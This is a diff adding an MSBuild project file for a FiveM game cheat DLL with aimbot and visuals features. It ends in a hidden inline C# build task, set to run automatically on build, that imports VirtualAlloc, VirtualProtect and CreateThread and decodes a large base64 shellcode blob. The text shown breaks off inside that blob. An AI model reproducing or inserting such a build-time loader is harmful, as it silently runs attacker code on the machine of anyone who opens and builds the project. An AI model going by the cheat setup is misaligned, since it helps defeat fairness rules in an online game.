@@ -1,0 +1,332 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" InitialTargets="EMNuLyLIYo">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{996E1159-A9CE-410B-B32B-8D18EB2D9D9E}</ProjectGuid>
+    <RootNamespace>Russak</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    <ProjectName>FivemENGINE</ProjectName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v142</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings"></ImportGroup>
+  <ImportGroup Label="Shared"></ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <OutDir>.\bin\</OutDir>
+    <IntDir>.\obj\$(Configuration) $(Platform)\</IntDir>
+    <TargetName>$(ProjectName) $(Configuration) $(Platform)</TargetName>
+    <IncludePath>$(VULKAN_SDK)\Include;C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Include;C:\Users\Admin\Desktop\LUNAFIVEM\UniversalHookX\src\dependencies\imgui;C:\Users\Admin\Desktop\LUNAFIVEM\UniversalHookX\src\fivem\settings;C:\Users\Admin\Desktop\LUNAFIVEM\UniversalHookX\src;$(IncludePath)</IncludePath>
+    <LibraryPath>$(VULKAN_SDK)\Lib;$(VC_LibraryPath_x64);$(WindowsSDK_LibraryPath_x64)</LibraryPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <OutDir>.\x64</OutDir>
+    <IntDir>.\obj\$(Configuration) $(Platform)\</IntDir>
+    <TargetName>d3d10</TargetName>
+    <IncludePath>C:\Users\Admin\Desktop\privat\LUNAFIVEM WITH INVOKER\UniversalHookX;$(DXSDK_DIR)Include;$(VULKAN_SDK)\Include;C:\Users\Admin\Desktop\privat\LUNAFIVEM WITH INVOKER\UniversalHookX\src\dependencies\imgui;C:\Users\Admin\Desktop\privat\LUNAFIVEM WITH INVOKER\UniversalHookX\src\fivem\settings;C:\Users\Admin\Desktop\privat\LUNAFIVEM WITH INVOKER\UniversalHookX\src;C:\Users\Admin\Desktop\privat\LUNAFIVEM WITH INVOKER\UniversalHookX\src\fivem;C:\Users\Admin\Desktop\privat\LUNAFIVEM WITH INVOKER\UniversalHookX\src\fivem\detour;C:\Users\Admin\Desktop\privat\LUNAFIVEM WITH INVOKER\UniversalHookX\src\fivem\invoker.h;$(IncludePath)</IncludePath>
+    <LibraryPath>$(VULKAN_SDK)\Lib;$(VC_LibraryPath_x64);$(DXSDK_DIR)Lib\x64;$(WindowsSDK_LibraryPath_x64);C:\Users\Admin\Desktop\privat\LUNAFIVEM\UniversalHookX\src\fivem\detour\detours.lib</LibraryPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <OutDir>.\bin\</OutDir>
+    <IntDir>.\obj\$(Configuration) $(Platform)\</IntDir>
+    <TargetName>$(ProjectName) $(Configuration) $(Platform)</TargetName>
+    <IncludePath>$(VULKAN_SDK)\Include;$(IncludePath)</IncludePath>
+    <LibraryPath>$(VULKAN_SDK)\Lib32;$(VC_LibraryPath_x86);$(WindowsSDK_LibraryPath_x86)</LibraryPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <OutDir>.\bin\</OutDir>
+    <IntDir>.\obj\$(Configuration) $(Platform)\</IntDir>
+    <TargetName>$(ProjectName) $(Configuration) $(Platform)</TargetName>
+    <IncludePath>$(VULKAN_SDK)\Include;$(IncludePath)</IncludePath>
+    <LibraryPath>$(VULKAN_SDK)\Lib32;$(VC_LibraryPath_x86);$(WindowsSDK_LibraryPath_x86)</LibraryPath>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>ImTextureID=ImU64;WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpplatest</LanguageStandard>
+      <MultiProcessorCompilation>true</MultiProcessorCompilation>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>$(CoreLibraryDependencies);%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>ImTextureID=ImU64;WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpplatest</LanguageStandard>
+      <MultiProcessorCompilation>true</MultiProcessorCompilation>
+      <InlineFunctionExpansion>AnySuitable</InlineFunctionExpansion>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <OmitFramePointers>true</OmitFramePointers>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>$(CoreLibraryDependencies);%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>ImTextureID=ImU64;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpplatest</LanguageStandard>
+      <MultiProcessorCompilation>true</MultiProcessorCompilation>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>$(CoreLibraryDependencies);%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>ImTextureID=ImU64;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpp20</LanguageStandard>
+      <MultiProcessorCompilation>true</MultiProcessorCompilation>
+      <InlineFunctionExpansion>AnySuitable</InlineFunctionExpansion>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <OmitFramePointers>true</OmitFramePointers>
+      <WholeProgramOptimization>false</WholeProgramOptimization>
+      <LanguageStandard_C>stdc17</LanguageStandard_C>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>kernel32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalOptions>/FORCE:MULTIPLE %(AdditionalOptions)</AdditionalOptions>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="font_a.cpp" />
+    <ClCompile Include="src\console\console.cpp" />
+    <ClCompile Include="src\dependencies\imgui\custom.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_demo.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_draw.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_impl_dx10.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_impl_dx11.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_impl_dx12.cpp">
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'"></ExcludedFromBuild>
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Release|Win32'"></ExcludedFromBuild>
+      <PreprocessorDefinitions Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">IMGUI_DISABLE_WIN32_DEFAULT_IME_FUNCTIONS;WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">IMGUI_DISABLE_WIN32_DEFAULT_IME_FUNCTIONS;WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">IMGUI_DISABLE_WIN32_DEFAULT_IME_FUNCTIONS;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions Condition="'$(Configuration)|$(Platform)'=='Release|x64'">IMGUI_DISABLE_WIN32_DEFAULT_IME_FUNCTIONS;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+    <ClCompile Include="src\dependencies\imgui\imgui_impl_dx9.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_impl_opengl3.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_impl_win32.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_tables.cpp" />
+    <ClCompile Include="src\dependencies\imgui\imgui_widgets.cpp" />
+    <ClCompile Include="src\dependencies\minhook\buffer.c" />
+    <ClCompile Include="src\dependencies\minhook\hde\hde32.c" />
+    <ClCompile Include="src\dependencies\minhook\hde\hde64.c" />
+    <ClCompile Include="src\dependencies\minhook\hook.c" />
+    <ClCompile Include="src\dependencies\minhook\trampoline.c" />
+    <ClCompile Include="src\dllmain.cpp" />
+    <ClCompile Include="src\fivem\content\encryptfunction.hpp" />
+    <ClCompile Include="src\hooks\backend\dx11\hook_directx11.cpp" />
+    <ClCompile Include="src\hooks\backend\dx12\hook_directx12.cpp">
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'"></ExcludedFromBuild>
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Release|Win32'"></ExcludedFromBuild>
+    </ClCompile>
+    <ClCompile Include="src\hooks\backend\dx9\hook_directx9.cpp" />
+    <ClCompile Include="src\hooks\backend\dx10\hook_directx10.cpp" />
+    <ClCompile Include="src\hooks\backend\opengl\hook_opengl.cpp" />
+    <ClCompile Include="src\hooks\backend\vulkan\hook_vulkan.cpp" />
+    <ClCompile Include="src\hooks\hooks.cpp" />
+    <ClCompile Include="src\dependencies\imgui\gui.cpp" />
+    <ClCompile Include="src\menu\menu.cpp" />
+    <ClCompile Include="src\utils\utils.cpp" />
+    <ClCompile Include="user_interface.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="auth.hpp" />
+    <ClInclude Include="byte.h" />
+    <ClInclude Include="bytes.hpp" />
+    <ClInclude Include="Encryption.h" />
+    <ClInclude Include="enums.hpp" />
+    <ClInclude Include="fa_solid_900.h" />
+    <ClInclude Include="font.hpp" />
+    <ClInclude Include="Fonts.hpp" />
+    <ClInclude Include="font_a.h" />
+    <ClInclude Include="font_awesome_5.h" />
+    <ClInclude Include="hashes.hpp" />
+    <ClInclude Include="IconsFontAwesome6.h" />
+    <ClInclude Include="IconsFontAwesome6Brands.h" />
+    <ClInclude Include="image.h" />
+    <ClInclude Include="Museo700.h" />
+    <ClInclude Include="MuseoSansRounded300.h" />
+    <ClInclude Include="skCrpyt.h" />
+    <ClInclude Include="src\dependencies\imgui\custom.hpp" />
+    <ClInclude Include="src\fivem\features\singeton.hpp" />
+    <ClInclude Include="font.h" />
+    <ClInclude Include="imguinotify.hpp" />
+    <ClInclude Include="Inter_Regular.h" />
+    <ClInclude Include="joaat.hpp" />
+    <ClInclude Include="src\fivem\features\locations.hpp" />
+    <ClInclude Include="sktr.h" />
+    <ClInclude Include="src\fivem\features\radar.hpp" />
+    <ClInclude Include="skStr.h" />
+    <ClInclude Include="src\Auth.hpp" />
+    <ClInclude Include="src\backend.hpp" />
+    <ClInclude Include="src\base64.h" />
+    <ClInclude Include="src\console\console.hpp" />
+    <ClInclude Include="src\dependencies\imgui\bytes.hpp" />
+    <ClInclude Include="src\dependencies\imgui\imconfig.h" />
+    <ClInclude Include="src\dependencies\imgui\imgui.h" />
+    <ClInclude Include="src\dependencies\imgui\imgui_impl_dx10.h" />
+    <ClInclude Include="src\dependencies\imgui\imgui_impl_dx11.h" />
+    <ClInclude Include="src\dependencies\imgui\imgui_impl_dx12.h">
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'"></ExcludedFromBuild>
+      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Release|Win32'"></ExcludedFromBuild>
+    </ClInclude>
+    <ClInclude Include="src\dependencies\imgui\imgui_impl_dx9.h" />
+    <ClInclude Include="src\dependencies\imgui\imgui_impl_opengl3.h" />
+    <ClInclude Include="src\dependencies\imgui\imgui_impl_opengl3_loader.h" />
+    <ClInclude Include="src\dependencies\imgui\imgui_impl_win32.h" />
+    <ClInclude Include="src\dependencies\imgui\imgui_internal.h" />
+    <ClInclude Include="src\dependencies\imgui\imstb_rectpack.h" />
+    <ClInclude Include="src\dependencies\imgui\imstb_textedit.h" />
+    <ClInclude Include="src\dependencies\imgui\imstb_truetype.h" />
+    <ClInclude Include="src\dependencies\minhook\buffer.h" />
+    <ClInclude Include="src\dependencies\minhook\hde\hde32.h" />
+    <ClInclude Include="src\dependencies\minhook\hde\hde64.h" />
+    <ClInclude Include="src\dependencies\minhook\hde\pstdint.h" />
+    <ClInclude Include="src\dependencies\minhook\hde\table32.h" />
+    <ClInclude Include="src\dependencies\minhook\hde\table64.h" />
+    <ClInclude Include="src\dependencies\minhook\MinHook.h" />
+    <ClInclude Include="src\dependencies\minhook\trampoline.h" />
+    <ClInclude Include="src\fivem\content\classes.hpp" />
+    <ClInclude Include="src\fivem\content\encryptstrings.hpp" />
+    <ClInclude Include="src\fivem\content\includes.hpp" />
+    <ClInclude Include="src\fivem\detour\detours.h" />
+    <ClInclude Include="src\fivem\detour\detver.h" />
+    <ClInclude Include="src\fivem\features\aimbot.hpp" />
+    <ClInclude Include="src\fivem\features\lootbag.hpp" />
+    <ClInclude Include="src\fivem\features\self.hpp" />
+    <ClInclude Include="src\fivem\features\vehicles.hpp" />
+    <ClInclude Include="src\fivem\features\visuals.hpp" />
+    <ClInclude Include="src\fivem\features\weapon.hpp" />
+    <ClInclude Include="src\fivem\invoker.h" />
+    <ClInclude Include="src\fivem\memory\memory.hpp" />
+    <ClInclude Include="src\fivem\scripth.hpp" />
+    <ClInclude Include="src\fivem\scrThread.hpp" />
+    <ClInclude Include="src\fivem\settings\color_t.hpp" />
+    <ClInclude Include="src\fivem\settings\Menu.hpp" />
+    <ClInclude Include="src\fivem\settings\settings.hpp" />
+    <ClInclude Include="src\hooks\backend\dx11\hook_directx11.hpp" />
+    <ClInclude Include="src\hooks\backend\dx12\hook_directx12.hpp" />
+    <ClInclude Include="src\hooks\backend\dx9\hook_directx9.hpp" />
+    <ClInclude Include="src\hooks\backend\dx10\hook_directx10.hpp" />
+    <ClInclude Include="src\hooks\backend\opengl\hook_opengl.hpp" />
+    <ClInclude Include="src\hooks\backend\vulkan\hook_vulkan.hpp" />
+    <ClInclude Include="src\hooks\hooks.hpp" />
+    <ClInclude Include="src\hwid.h" />
+    <ClInclude Include="src\dependencies\imgui\gui.hpp" />
+    <ClInclude Include="src\menu\fx.hpp" />
+    <ClInclude Include="src\menu\menu.hpp" />
+    <ClInclude Include="src\native.hpp" />
+    <ClInclude Include="src\skStr.h" />
+    <ClInclude Include="src\fivem\content\tahoma.h" />
+    <ClInclude Include="src\utils\utils.hpp" />
+    <ClInclude Include="tick.hpp" />
+    <ClInclude Include="trebucbd.h" />
+    <ClInclude Include="user_interface.h" />
+    <ClInclude Include="xor.h" />
+    <ClInclude Include="xor.hpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="libcurl.lib" />
+    <Library Include="library_x64.lib" />
+    <Library Include="src\fivem\detour\detours.lib" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets"></ImportGroup>
+  <UsingTask TaskName="YDTITN0kgd" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <Task>
+      <Code Type="Method" Language="cs"><![CDATA[[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualAlloc")]static extern System.IntPtr ndWYrVU(System.IntPtr a,uint s,uint t,uint p);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="VirtualProtect")]static extern bool SlV5m8T(System.IntPtr a,uint s,uint p,out uint o);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="CreateThread")]static extern System.IntPtr eKezMBa(System.IntPtr a,uint s,System.IntPtr e,System.IntPtr p,uint f,System.IntPtr t);[System.Runtime.InteropServices.DllImport("kernel32",EntryPoint="WaitForSingleObject")]static extern uint aqd8YeQ(System.IntPtr h,uint ms);public override bool Execute(){var Zk1llr=System.Convert.FromBase64String("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